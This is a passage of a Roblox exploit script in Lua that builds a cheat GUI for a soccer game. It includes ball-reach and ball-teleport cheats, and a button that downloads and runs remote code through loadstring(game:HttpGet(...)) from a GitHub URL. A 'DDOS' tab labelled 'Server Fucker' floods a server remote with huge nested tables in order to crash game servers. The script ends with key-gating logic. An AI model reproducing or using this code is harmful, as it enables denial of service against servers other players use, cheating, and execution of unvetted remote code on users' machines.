firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

---------------------------------------------------------------------------
local Tab = Window:NewTab("Ball TP")

local Section = Tab:NewSection("Ball TP")
Section:NewButton("Execute", "ButtonInfo", function()
local Input = game:GetService('UserInputService');
local Players = game:GetService('Players')
local Player = Players['LocalPlayer'];
local Key = 'K';

while wait() do
  if Input:IsKeyDown(Enum.KeyCode[Key]) then
    local Char = Player.Character
    local HRP = Char and Char:FindFirstChild('HumanoidRootPart')
    local Ball = HRP and workspace.Balls:FindFirstChild('TPS')
    local Mag = Ball and (function(p, p1)
      return ((p.Position - p1.Position).magnitude)
    end)

    if Mag then
      local pos = Mag(HRP, Ball)
      repeat wait()
        pos = Mag(HRP, Ball)
      until (not Input:IsKeyDown(Enum.KeyCode[Key])) or (pos <= 150)
      Ball.CFrame = HRP.CFrame
    end
  end
end
end)

local Section = Tab:NewSection("u cant disable if u execute it")
local Section = Tab:NewSection("press k to use")
---
local Tab = Window:NewTab("MPS 4-A-SIDE")
local Section = Tab:NewSection("4-A-SIDE BIGFOOT")
Section:NewButton("Execute", "ButtonInfo", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/3kizy/sd/main/README.md", true))()
end)

-----
local Tab = Window:NewTab("DDOS")
local Section = Tab:NewSection("Ddos Merchant")
Section:NewButton("Server Fucker", "LT.#9171", function()
    print("Clicked")
_G.on = true --// toggle

while wait(1.3) do --// don't change it's the best
   if _G.on == true then
   game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
   local function getmaxvalue(val)
      local mainvalueifonetable = 499999
      if type(val) ~= "number" then
          return nil
      end
      local calculateperfectval = (mainvalueifonetable/(val+2))
      return calculateperfectval
   end

   local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}

    table.insert(spammedtable, {})
    z = spammedtable[1]

    for i = 1, tableincrease do
       local tableins = {}
       table.insert(z, tableins)
       z = tableins
    end

    local calculatemax = getmaxvalue(tableincrease)
    local maximum

    if calculatemax then
        maximum = calculatemax
        else
        maximum = 10000
    end

    for i = 1, maximum do
        table.insert(maintable, spammedtable)
    end

    for i = 1, tries do
        game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
    end
   end

   bomb(250, 2) --// change values if client crashes
end
   end
end)

------

local Tab = Window:NewTab("Toggle")
local Section = Tab:NewSection("TOGGLE")

Section:NewKeybind("To Hide GUI", "Hide GUI", Enum.KeyCode.P, function()
	Library:ToggleUI()
end)

else
      lc:kick("Not In Group,Copied Link,Paste It On Your Browser") -- Doesn't have to be kicked
      setclipboard(grouplink)
end
OrionLib:Destroy() -- keep this its needed
end


Key:AddTextbox({
    Name = "Enter Key",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        _G.KeyInput = Value
    end      
})


Key:AddButton({
    Name = "Check Key",
    Callback = function()
              if _G.KeyInput == _G.Key then
                MakeScriptHub()
print("Loaded")
            end
      end    
})
